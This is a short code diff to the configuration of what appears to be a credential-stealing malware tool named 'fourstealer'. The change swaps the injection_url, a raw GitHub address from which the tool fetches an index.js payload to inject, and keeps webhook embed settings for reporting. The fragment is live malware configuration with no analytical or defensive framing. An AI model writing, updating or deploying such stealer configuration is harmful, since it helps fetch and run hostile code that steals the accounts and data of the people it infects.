@@ -14,7 +14,7 @@ const config = {
   embed_name: 'fourstealer Injection', 
   embed_icon: 'https://i.pinimg.com/736x/dc/f9/43/dcf94331affdc16ad329e9e79815fe87.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/octopus-warriorss/asdadasd/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/onqc/fourstealer/refs/heads/main/index.js', 
   /**
    
    **/
